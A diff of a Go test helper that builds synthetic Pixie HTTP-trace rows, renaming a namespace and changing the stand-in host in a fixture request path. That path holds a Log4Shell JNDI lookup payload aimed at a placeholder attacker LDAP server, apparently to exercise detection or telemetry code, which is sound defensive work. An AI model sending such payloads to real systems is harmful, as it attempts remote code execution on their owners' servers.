@@ -53,7 +53,7 @@ func makePixieRowsBatch(n int) []map[string]any {
 		out[i] = map[string]any{
 			"time_":         time.Unix(0, int64(1_700_000_000_000_000_000+i)),
 			"upid":          fmt.Sprintf("0000000100000000-00000000-%016x", uint64(i)),
-			"namespace":     "log4j-poc",
+			"namespace":     "svc-poc",
 			"pod":           "backend-vulnerable-779cd9d765-mxr8t",
 			"remote_addr":   "10.0.0.45",
 			"remote_port":   int64(54321 + i%100),
@@ -66,7 +66,7 @@ func makePixieRowsBatch(n int) []map[string]any {
 			"content_type":  int64(0),
 			"req_headers":   `{"User-Agent":"Apache-HttpClient/4.5.13","Accept":"*/*","Content-Type":"application/json"}`,
 			"req_method":    "POST",
-			"req_path":      "/api/v1/products/${jndi:ldap://attacker.example/Payload}",
+			"req_path":      "/api/v1/products/${jndi:ldap://evil.example/Payload}",
 			"req_body":      `{"id":42,"qty":1}`,
 			"resp_headers":  `{"Content-Type":"application/json","Server":"jetty"}`,
 			"resp_status":   int64(500),
